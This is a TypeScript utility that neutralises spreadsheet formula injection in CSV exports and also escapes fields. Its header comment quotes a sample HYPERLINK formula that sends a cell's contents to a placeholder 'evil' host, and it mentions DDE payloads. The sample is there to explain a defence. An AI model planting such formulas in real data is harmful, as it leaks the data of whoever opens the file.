/**
 * WWL-123 — CSV / spreadsheet formula-injection neutralisation.
 *
 * Every export in this product carries at least one customer-supplied column
 * (customer name, notes, review text, guest names). A cell that begins with
 * `=`, `+`, `-`, `@`, a tab or a CR is evaluated as a formula when the file is
 * opened in Excel, LibreOffice or Google Sheets — so a customer could put
 * `=HYPERLINK("http://evil/?"&A1,"Click")` or a DDE payload into a name field
 * and have it run on the vendor's machine.
 *
 * The OWASP-recommended fix: prefix the offending cell with a single quote and
 * quote the field, so the spreadsheet treats it as text. Legitimate values are
 * untouched, including negative numbers, which parse as numbers rather than
 * formulas.
 *
 * This is the single implementation. Anything that writes a CSV or an xlsx must
 * use it — see `components/dashboard/shared/export-menu.tsx`.
 */

const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/** Prefix a cell a spreadsheet would evaluate, so it is read as text. */
export function neutraliseFormula(value: string): string {
  if (
    value.length > 0 &&
    FORMULA_TRIGGERS.includes(value[0]) &&
    !/^-?\d+(\.\d+)?$/.test(value)
  ) {
    return `'${value}`;
  }
  return value;
}

/** RFC-4180 escaping *plus* formula neutralisation. */
export function escapeCsv(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);
  const s = neutraliseFormula(raw);
  return /[",\n\r\t]/.test(s) || s !== raw ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Join a matrix of cells into a CSV body with every cell neutralised. */
export function toCsv(matrix: unknown[][]): string {
  return matrix.map((row) => row.map(escapeCsv).join(",")).join("\n");
}
